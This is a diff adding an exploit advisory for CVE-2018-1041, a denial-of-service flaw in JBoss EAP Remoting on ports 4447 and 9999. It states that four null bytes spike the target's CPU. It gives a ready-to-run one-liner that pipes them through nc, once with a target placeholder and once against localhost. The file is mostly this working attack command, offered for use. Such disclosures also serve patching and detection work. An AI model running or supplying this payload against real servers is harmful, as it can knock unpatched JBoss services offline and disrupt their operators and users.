@@ -1,0 +1,29 @@
+# Exploit Title: Exploit Denial of Service JBoss Remoting (4447/9999)
+
+# Date: 14-02-2018
+
+# Exploit Author: Frank Spierings
+
+# Vendor Homepage:
+https://www.redhat.com/en/technologies/jboss-middleware/application-platform/get-started
+
+# Software Link: http://ftp.redhat.com/pub/redhat/jboss/eap/
+
+# Version: JBoss EAP 6.14.18 | Fixed in JBoss EAP 6.14.19
+
+# Tested on: Red Hat Enterprise Linux Server release 7.4 |
+
+# CVE : CVE-2018-1041
+
+
+
+This is a very easy Denial of Service exploit. The target only requires 4
+null bytes: `\x00\x00\x00\x00`.
+
+The CPU will instantly spike after receiving this payload.
+
+
+
+printf "\x00\x00\x00\x00" | nc <target> <port = 4447|9999>
+
+`printf "\x00\x00\x00\x00" | nc 127.0.0.1 4447`
